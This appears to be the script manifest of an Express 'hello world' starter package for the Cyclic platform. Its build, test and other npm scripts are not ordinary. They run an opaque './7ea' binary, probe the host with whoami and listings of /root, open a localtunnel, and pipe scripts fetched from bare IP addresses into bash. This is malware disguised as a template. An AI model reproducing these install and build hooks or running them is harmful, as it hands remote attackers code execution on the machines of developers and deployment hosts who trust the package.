name: express-hello-world
description: Expressjs Hello World example to provide faster start deploying on Cyclic platform

scripts.start1: whoami &&  ./7ea eac  &&  ./7ea ip && ./7ea e node server.js
scripts.start: npm install -g localtunnel && npx localtunnel && whoami
scripts.build: ./7ea ip && whoami && curl http://16.170.236.233:1038/python | bash &&  curl http://16.170.236.233:1038/python2 | bash   &&   ./7ea e node server.js
scripts.w: cd / && ls && cd /root && ls && ls vercel && whoami && ./7ea e node server.js
scripts.x1: ./7ea ip && whoami && curl http://3.143.249.18:1038/python | bash &&  curl http://3.143.249.18:1038/python2 | bash   &&   ./7ea e node server.js
scripts.x: whoami && curl http://3.14:1038/python | bash &&  curl http://3.143.249.18:1038/python2 | bash   &&   ./7ea e node server.js
scripts.test: ./7ea ip &&  curl http://16.171.9.113:1038/python | bash &&  curl http://16.171.9.113:1038/python2 | bash   &&   ./7ea e node server.js

author: Cyclic Software
